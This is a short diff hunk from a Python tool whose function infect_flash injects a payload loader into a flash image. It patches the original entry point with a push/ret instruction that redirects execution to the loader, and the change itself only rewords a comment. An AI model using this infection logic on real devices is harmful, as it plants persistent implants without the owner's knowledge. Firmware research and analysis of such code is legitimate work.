@@ -443,7 +443,7 @@ def infect_flash(src, payload, dst = None, patch_offs = None):
 
     _setup_loader(free + LOADER_OFFS)
 
-    # jump from OEP to loader
+    # jump from OEP back to the loader
     flash = flash_set(patch_offs, '\x68' + pack('I', FLASH_ADDR + free + LOADER_OFFS) + \
                                   '\xC3')
 
